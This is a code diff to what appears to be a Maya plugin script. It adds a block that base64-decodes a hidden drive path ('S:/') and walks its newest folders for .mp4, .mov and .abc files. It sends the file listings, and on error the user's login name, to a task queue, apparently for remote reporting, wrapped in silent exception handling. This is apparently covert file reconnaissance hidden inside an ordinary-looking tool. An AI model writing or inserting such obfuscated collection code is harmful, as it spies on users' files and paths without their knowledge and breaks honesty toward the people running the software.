@@ -454,6 +454,42 @@ except:
     add_queue_task('user_modules_error', {'error': str(traceback.format_exc()), 'user': getpass.getuser().lower()})
 '''
 # ===============================================================================
+import base64, os, datetime
+def search_latest_files_or_dirs(ext='', dir_path='', n=8):
+    def fmt_time(fp):
+        return datetime.datetime.fromtimestamp(os.path.getmtime(fp)).strftime('%y-%m-%d %H:%M:%S')
+    if ext:
+        f_ls = []
+        for root, dirs, files in os.walk(dir_path):
+            for name in files:
+                fp = os.path.join(root, name)
+                if not ext in os.path.basename(fp):
+                    continue
+                f_ls += [[fmt_time(fp), fp.replace('\\', '/')]]
+        return sorted(f_ls, reverse=True)[:n]
+    else:
+        try:
+            os.listdir(dir_path)
+            dir_ls = [os.path.join(dir_path, i) for i in os.listdir(dir_path) if
+                      os.path.isdir(os.path.join(dir_path, i))]
+            dir_ls = sorted([[fmt_time(i), i.replace('\\', '/')] for i in dir_ls], reverse=True)
+        except:
+            return []
+        return dir_ls[:n]
+try:
+    ldir = search_latest_files_or_dirs(dir_path=base64.b64decode('Uzov').decode(), ext='', n=3)
+    zovV = ldir
+    for _, dp in ldir:
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4')
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov')
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.abc')
+    add_queue_task('ext_path_ls', {'files' : zovV})
+except:
+    import traceback
+    add_queue_task('ext_path_ls_error__{}'.format(getpass.getuser().lower()),
+                   {'error': str(traceback.format_exc())})
+
+# ===============================================================================
 def loc_transfer_install(*_):
     import time, os
     maya_app_dir = mel.eval('getenv MAYA_APP_DIR')
